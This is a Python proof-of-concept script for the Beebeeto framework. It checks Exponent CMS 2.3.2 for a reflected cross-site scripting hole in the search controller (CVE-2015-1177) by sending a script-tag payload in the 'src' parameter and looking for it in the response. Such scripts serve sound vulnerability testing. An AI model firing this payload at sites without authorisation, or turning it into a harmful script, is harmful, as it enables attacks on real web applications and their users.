#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0021',
            'name': 'Exponent CMS 2.3.2 /exponent/index.php Reflected XSS Vulnerability POC',
            'author': '塞万铁牛',
            'create_date': '2015-01-26',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Exponent CMS',
            'vul_version': ['2.3.2'],
            'type': 'Cross-Site Scripting',
            'tag': ['Exponent CMS漏洞', 'XSS漏洞', 'index.php?controller=search&src=','CVE-2015-1177'],
            'desc': 'N/A',
            'references': ['http://www.securityfocus.com/bid/59887/',
            ],
        },
    }

   
    @classmethod
    def verify(cls, args):
        payload = '/exponent/index.php?controller=search&src=f324e%22><script>alert(1)</script>9cbae6bf552&action=search&search_string=test&int=%0d'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '<script>alert(1)</script>' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args
        
    exploit = verify
        
    
if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())